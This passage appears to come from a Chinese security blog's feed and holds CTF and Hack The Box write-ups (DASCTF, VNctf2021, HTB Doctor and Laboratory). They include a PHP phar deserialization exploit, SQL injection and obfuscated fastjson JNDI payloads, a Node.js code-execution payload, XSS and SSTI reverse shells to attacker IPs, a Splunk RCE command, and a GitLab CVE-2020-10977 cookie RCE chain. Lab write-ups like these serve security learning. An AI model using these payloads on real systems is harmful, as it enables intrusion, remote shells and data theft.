class="line">obtest.close();</span><br></pre></td></tr></table></figure><p>该poc只适用于<code>jdk8u71</code>之前，因为在后面<code>sun.reflect.annotation.AnnotationInvocationHandler</code>进行了重写，就无法触发该漏洞</p>]]></content>
      
      
      
        <tags>
            
            <tag> java_study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF</title>
      <link href="/2021/10/31/general/DASCTF/"/>
      <url>/2021/10/31/general/DASCTF/</url>
      
        <content type="html"><![CDATA[<p>审计源码发现有变量覆盖漏洞，可以把template覆盖，配合file_get_contents造成任意文件读取</p><p>尝试读template.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?var[template][1]=template.php&amp;tp=1</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pattern</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$suffix</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pattern = <span class="string">&quot;/&#123;&#123;([a-z]+)&#125;&#125;/&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;suffix = <span class="string">&quot;.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;render();</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">True</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="keyword">$this</span>-&gt;pattern, <span class="keyword">$this</span>-&gt;content, <span class="variable">$matches</span>)!==<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">global</span> $&#123;<span class="variable">$matches</span>[<span class="number">1</span>]&#125;;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($&#123;<span class="variable">$matches</span>[<span class="number">1</span>]&#125;)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;content = preg_replace(<span class="keyword">$this</span>-&gt;pattern, $&#123;<span class="variable">$matches</span>[<span class="number">1</span>]&#125;, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;suffix)&gt;<span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error suffix&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&#x27;/var/www/html/test/uploads/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&quot;/&quot;</span> . md5(<span class="keyword">$this</span>-&gt;content) . <span class="keyword">$this</span>-&gt;suffix;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Your html file is in &quot;</span> . <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显可以使用phar反序列化写文件</p><p>render()方法中会正则匹配<code>&#123;&#123;&#125;&#125;</code>里内容，然后当作全局变量使用，这样我们可以使用前面的任意变量覆盖对参数进行修改</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pattern</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$suffix</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$content</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pattern = <span class="string">&quot;/&#123;&#123;([a-z]+)&#125;&#125;/&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;suffix = <span class="string">&quot;.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;render();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">True</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="keyword">$this</span>-&gt;pattern, <span class="keyword">$this</span>-&gt;content, <span class="variable">$matches</span>)!==<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">global</span> $&#123;<span class="variable">$matches</span>[<span class="number">1</span>]&#125;;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($&#123;<span class="variable">$matches</span>[<span class="number">1</span>]&#125;)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;content = preg_replace(<span class="keyword">$this</span>-&gt;pattern, $&#123;<span class="variable">$matches</span>[<span class="number">1</span>]&#125;, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;suffix)&gt;<span class="number">5</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error suffix&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&#x27;/var/www/html/uploads/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&quot;/&quot;</span> . md5(<span class="keyword">$this</span>-&gt;content) . <span class="keyword">$this</span>-&gt;suffix;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Your html file is in &quot;</span> . <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> Phar(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Template();</span><br><span class="line"><span class="variable">$a</span>-&gt;content=<span class="string">&quot;&lt;?php &#123;&#123;abc&#125;&#125; ?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;text&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>我们将生成的phar文件上传再调用触发反序列化</p><p><img src="/2021/10/31/general/DASCTF/image-20201226131349024.png" alt="image-20201226131349024"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://8.129.41.25:10305?var[template][1]=phar:///var/www/html/test/uploads/723ee8e952c6c25ff6277a2f95c77a08/d78ae792e3958c6c8da2e7a8f9de9391.html&amp;tp=1&amp;abc=phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/DASCTF/image-20201226131314432.png" alt="image-20201226131314432"></p><p>我们成功生成了php文件</p><p><img src="/2021/10/31/general/DASCTF/image-20201226131436427.png" alt="image-20201226131436427"></p><p>成功执行命令</p><p>我们传入一句话木马成功拿到flag</p><p><img src="/2021/10/31/general/DASCTF/image-20201226131624759.png" alt="image-20201226131624759"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vnctf2021</title>
      <link href="/2021/10/31/general/VNctf2021wp/"/>
      <url>/2021/10/31/general/VNctf2021wp/</url>
      
        <content type="html"><![CDATA[<h2 id="Ez-game"><a href="#Ez-game" class="headerlink" title="Ez_game"></a>Ez_game</h2><p>是一个用js写的前端小游戏，直接找到初始化的函数将生命和武器调大</p><p><img src="/2021/10/31/general/VNctf2021wp/image-20210316150206190.png" alt="image-20210316150206190"></p><p>直接调用初始化函数Init()和NextLevel()函数跳关，通关即可</p><p><img src="/2021/10/31/general/VNctf2021wp/image-20210316150647294.png" alt="image-20210316150206190"></p><h2 id="realezjvav"><a href="#realezjvav" class="headerlink" title="realezjvav"></a>realezjvav</h2><p>笛卡尔积注入以及fastjson RCE </p><p>进去以后是一个登录页面，提示数据量不大</p><p>猜测是sql注入，fuzz一下</p><p><img src="/2021/10/31/general/VNctf2021wp/image-20210316153519410.png" alt="image-20210316153519410"></p><p>报错注入，时间注入都被禁了，最终尝试笛卡尔积注入成功</p><p>payload</p><p><code>username=admin&amp;password=1&#39;and if((ascii(substr((select database(),1,1))&lt;200),(SELECT count(*) FROM information_schema.columns A,information_schema.columns B),0);#</code></p><p>相应时间大概0.6s，最终跑出密码成功登陆</p><p>查看源码，发现一处可以任意文件读取</p><p><strong><img src="/2021/10/31/general/VNctf2021wp/image-20210316162413676.png" alt="image-20210316162413676"></strong></p><p>尝试读取springboot的pom.xml</p><p><img src="/2021/10/31/general/VNctf2021wp/image-20210316162558262.png" alt="image-20210316162558262"></p><p>看到了使用了fastjson，并且该版本有RCE,尝试利用</p><p>利用github上师傅的项目</p><p><code>&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;x&quot;:&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://IP:7777/Exploit&quot;,&quot;autoCommit&quot;:true&#125;&#125;&#125;</code></p><p>发现有过滤，后来大师傅说可以unicode绕过，然后找到P牛星球上的文章</p><p><img src="/2021/10/31/general/VNctf2021wp/image-20210316163016012.png" alt="image-20210316163016012"></p><p>将部分关键词替换unicode编码</p><p>利用大师傅的项目即可弹shell</p><p>附上链接<code>https://github.com/CaijiOrz/fastjson-1.2.47-RCE</code></p><p>最终payload</p><p><code>&#123;&quot;name&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;&#125;,&quot;x&quot;:&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c&quot;,&quot;dataSourceName&quot;:&quot;ldap://106.15.250.31:1389/Exploit&quot;,&quot;\u0061\u0075\u0074\u006f\u0043\u006f\u006d\u006d\u0069\u0074&quot;:true&#125;&#125;&#125;</code></p><h2 id="navie"><a href="#navie" class="headerlink" title="navie"></a>navie</h2><p>一道js配合re题，web🐶实在不会</p><p>源码奉上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">import express from &quot;express&quot;;</span><br><span class="line">import bindings from &quot;bindings&quot;;</span><br><span class="line">import &#123; fileURLToPath &#125; from &#x27;url&#x27;</span><br><span class="line">import path from &quot;path&quot;;</span><br><span class="line"></span><br><span class="line">import pkg from &#x27;expression-eval&#x27;;</span><br><span class="line">const &#123; eval: eval_, parse &#125; = pkg;</span><br><span class="line"></span><br><span class="line">const addon = bindings(&quot;addon&quot;);</span><br><span class="line"></span><br><span class="line">const file = fileURLToPath(import.meta.url);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line">app.use(express.urlencoded(&#123; extended: true &#125;));</span><br><span class="line"></span><br><span class="line">app.use(express.static(&quot;static&quot;));</span><br><span class="line"></span><br><span class="line">app.use(&quot;/eval&quot;, (req, res) =&gt; &#123;</span><br><span class="line">  const e = req.body.e;</span><br><span class="line">  const code = req.body.code;</span><br><span class="line">  if (!e || !code) &#123;</span><br><span class="line">    res.send(&quot;wrong?&quot;);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  try &#123;</span><br><span class="line">    if (addon.verify(code)) &#123;</span><br><span class="line">      res.send(String(eval_(parse(e))));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      res.send(&quot;wrong?&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; catch (e) &#123;</span><br><span class="line">    console.log(e)</span><br><span class="line">    res.send(&quot;wrong?&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(&quot;/source&quot;, (req, res) =&gt; &#123;</span><br><span class="line">  let p = req.query.path || file;</span><br><span class="line">  p = path.resolve(path.dirname(file), p);</span><br><span class="line">  if (p.includes(&quot;flag&quot;)) &#123;</span><br><span class="line">    res.send(&quot;no flag!&quot;);</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    res.sendFile(p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use((err, req, res, next) =&gt; &#123;</span><br><span class="line">  console.log(err)</span><br><span class="line">  res.redirect(&quot;index.html&quot;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(process.env.PORT || 80);</span><br></pre></td></tr></table></figure><p>看到导入了一个自己写的模块，并且可以读取文件</p><p>并且说明静态目录为static，可以尝试读取binding.gyp</p><p><img src="/2021/10/31/general/VNctf2021wp/image-20210316171820329.png" alt="image-20210316171820329"></p><p>或者去读运行的服务也可以读到</p><p><img src="/2021/10/31/general/VNctf2021wp/image-20210316171950805.png" alt="image-20210316171950805"></p><p>总之我们知道生成了一个addon模块，尝试去读addon模块</p><p>查阅资料知道默认会在./build/Release/下生成.node文件，也就是addon.node</p><p><img src="/2021/10/31/general/VNctf2021wp/image-20210316172158973.png" alt="image-20210316172158973"></p><p>下载后反编译拿到code(ps:我不会🐶)</p><p>利用constructor构造函数，并利用import动态导入</p><p>发现并无法弹shell，只能利用写入文件读</p><p>payload</p><p><code>e=(1).constructor.constructor(&quot;return import(&#39;child_process&#39;).then(child_process=&gt;&#123;child_process.exec(&#39;cat /flag &gt; ./test &#39;)&#125;)&quot;)();&amp;code=yoshino-s_want_a_gf%2Cqq1735439536</code></p><p><img src="/2021/10/31/general/VNctf2021wp/image-20210316172827716.png" alt="image-20210316172827716"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docter</title>
      <link href="/2021/10/31/general/%5BHTB%5DDT/"/>
      <url>/2021/10/31/general/%5BHTB%5DDT/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/10/31/general/[HTB]DT/image-20201202204034122.png" alt="image-20201202204034122"></p><p>需要添加一条hosts</p><blockquote><p>10.10.10.209    doctors.htb</p></blockquote><p>首先nmap扫一波</p><p><img src="/2021/10/31/general/[HTB]DT/image-20201203172229375.png" alt="image-20201203172229375"></p><p>有登录框，注册一个用户，登陆上有一个留言界面，看大佬可以XSS反弹shell(: </p><p>ps:涉及到我的知识盲区了</p><p>利用的是nc的<code>-e``-c</code>，只有在nc.traditional版本中才有，而正常的ubuntu发行版是nc.openbsd</p><p>不带<code>-e``-c</code></p><p><img src="/2021/10/31/general/[HTB]DT/image-20201202205447400.png"></p><p><img src="/2021/10/31/general/[HTB]DT/image-20201202205525591.png" alt="image-20201202205525591"></p><p>利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=http://10.10.14.2/$(nc.traditional$IFS-e$IFS/bin/bash$IFS&#x27;10.10.14.2&#x27;$IFS&#x27;4444&#x27;)&gt;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/[HTB]DT/image-20201202210611483.png" alt="image-20201202210611483"></p><p><img src="/2021/10/31/general/[HTB]DT/image-20201202210655333.png" alt="image-20201202210655333"></p><p>成功弹到shell，可以用python建立一个伪终端</p><p><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p><p>看大佬还可以用ssti</p><p>在<code>/archive</code>页面可以触发</p><p><img src="/2021/10/31/general/[HTB]DT/image-20201203155607423.png" alt="image-20201203155607423"></p><p>同样可以反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;system&#x27;](&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1&#x27;&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>登陆上后我们是普通用户权限</p><p>去home下还有一个用户shaun</p><p>在/var/log/apache2下面有个backup，在里面发现重置密码流量，尝试登录</p><p><img src="/2021/10/31/general/[HTB]DT/image-20201203170240804.png" alt="image-20201203170240804"></p><p>登陆成功，但还是普通用户权限，无果</p><p>开始nmap扫出了8089有个splunkd服务</p><p>通过Splunk错误配置，可以进行本地提权或远程执行代码</p><p>我们尝试使用获得的账户和密码来反弹shell，附上<a href="https://github.com/falipan/SplunkWhisperer2">github项目</a></p><p>执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.2 --username shaun --password Guitar123 --payload &quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.2/4444 0&gt;&amp;1&#x27;&quot;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/[HTB]DT/image-20201203195145214.png" alt="image-20201203195145214"></p><p>这样我们就拿到了root用户</p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laboratory</title>
      <link href="/2021/10/31/general/%5BHTB%5DLaboratory/"/>
      <url>/2021/10/31/general/%5BHTB%5DLaboratory/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/10/31/general/[HTB]Laboratory/image-20201208214932228.png" alt="image-20201208214932228"></p><p>上手nmap先扫一波</p><p><img src="/2021/10/31/general/[HTB]Laboratory/image-20201210092255794-5674436.png" alt="image-20201210092255794"></p><p>有个web服务,可以看到443端口DNS解析到git.laboratory.htb</p><p>所以我们在hosts添加一条</p><p>访问git.laboratory.htb，发现是一个gitlab</p><p>利用CVE-2020-10977可以任意文件读取以及rce</p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>[CVE-2020-10977]](<a href="https://hackerone.com/reports/827052">https://hackerone.com/reports/827052</a>)</p><p>任意创建两个项目，并在其中一个提交一个新的issues</p><p><code>![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)</code></p><p><img src="/2021/10/31/general/[HTB]Laboratory/image-20201210093356128.png"></p><p>并在其中横向移动到另一个仓库，即可触发漏洞</p><p><img src="/2021/10/31/general/[HTB]Laboratory/image-20201210093620987.png" alt="image-20201210093620987"></p><p>拿到其中<code>secret_key_base</code></p><p><img src="/2021/10/31/general/[HTB]Laboratory/image-20201210093721361.png" alt="image-20201210093721361"></p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>我们需要在本地搭一个giltlab，可以直接从docker推镜像</p><p>将本地的<code>secret_key_base</code>替换，进入gitlab-rails console</p><p>依次执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request = ActionDispatch::Request.new(Rails.application.env_config)</span><br><span class="line">request.env[&quot;action_dispatch.cookies_serializer&quot;] = :marshal</span><br><span class="line">cookies = request.cookie_jar</span><br><span class="line">erb = ERB.new(&quot;&lt;%= `bash -c &#x27;/bin/bash -i &gt;&amp; /dev/tcp/ip/4444 0&gt;&amp;1&#x27;` %&gt;&quot;)</span><br><span class="line">depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, &quot;@result&quot;, ActiveSupport::Deprecation.new)</span><br><span class="line">cookies.signed[:cookie] = depr</span><br><span class="line">puts cookies[:cookie]</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/[HTB]Laboratory/image-20201210095023947.png" alt="image-20201210095023947"></p><p>本地监听4444，用curl发包</p><p><code>curl -vvv &#39;https://git.laboratory.htb/users/sign_in&#39; -b &quot;experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kieiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjQvNDQ0NCAwPiYxJ2AgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--1bdc8a5aa25ee2016f5912f3501514af5eb84c7b&quot; -k</code></p><p>成功弹到shell</p><p><img src="/2021/10/31/general/[HTB]Laboratory/image-20201210095341130.png" alt="image-20201210095341130"></p><p>现在我们可以利用gitlab-rails console来修改管理员账户密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user = User.where(id: 1).first </span><br><span class="line">user.password = &#x27;12345678&#x27;</span><br><span class="line">user.password_confirmation = &#x27;12345678&#x27;</span><br><span class="line">user.save!</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/[HTB]Laboratory/image-20201210095920496.png" alt="image-20201210095920496"></p><p>修改成功，用管理员登录</p><p>管理员下面有两个仓库，其中一个里面有个ssh私钥，可以利用ssh私钥无密码登录，但私钥使用的是openssh格式，我们需要转换为rsa格式才能使用</p><p>利用pyttygen可以转换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">puttygen test -o test.ppk</span><br><span class="line">puttygen test.ppk -O private-openssh -o test.oldformat</span><br></pre></td></tr></table></figure><p>最后直接私钥登录拿到shell</p><p><img src="/2021/10/31/general/[HTB]Laboratory/image-20201210100428376.png" alt="image-20201210100428376"></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HardXss复现</title>
      <link href="/2021/10/31/general/%5BQWB%5DHardXss/"/>
      <url>/2021/10/31/general/%5BQWB%5DHardXss/</url>
      
